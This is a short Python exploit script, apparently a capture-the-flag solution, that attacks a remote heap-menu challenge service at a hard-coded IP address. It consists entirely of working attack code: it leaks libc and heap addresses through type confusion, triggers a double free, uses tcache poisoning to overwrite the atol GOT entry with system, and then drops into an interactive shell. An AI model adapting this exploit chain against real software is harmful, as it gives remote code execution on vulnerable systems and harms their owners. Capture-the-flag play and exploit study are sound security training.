from ptrlib import *

def add(t, d):
    sock.sendlineafter("> ", "1")
    sock.sendlineafter(": ", str(t))
    sock.sendafter(": ", d)
    return

def get(i, t):
    sock.sendlineafter("> ", "2")
    sock.sendlineafter(": ", str(i))
    sock.sendlineafter(": ", str(t))
    sock.recvuntil("Data: ")
    return sock.recvline()

def edit(i, t, d):
    sock.sendlineafter("> ", "3")
    sock.sendlineafter(": ", str(i))
    sock.sendlineafter(": ", str(t))
    sock.sendafter(": ", d)

def delete(i):
    sock.sendlineafter("> ", "4")
    sock.sendlineafter(": ", str(i))
    return

libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
elf = ELF("../distfiles/chall")
sock = Socket("13.231.207.73", 9007)

# libc leak (type confusion)
add(1, str(elf.got("puts")))
addr_puts = u64(get(0, 3))
libc_base = addr_puts - libc.symbol("puts")
logger.info("libc base = " + hex(libc_base))

# heap leak (type confusion)
add(3, "A" * 8)
addr_heap = int(get(1, 1))
logger.info("addr heap = " + hex(addr_heap))

# double free (free pool)
edit(0, 1, str(addr_heap))
delete(1)
delete(0)

# tcache poisoning
add(3, p64(elf.got("atol")))
add(3, "A" * 8)
add(3, p64(libc_base + libc.symbol("system")))

sock.interactive()
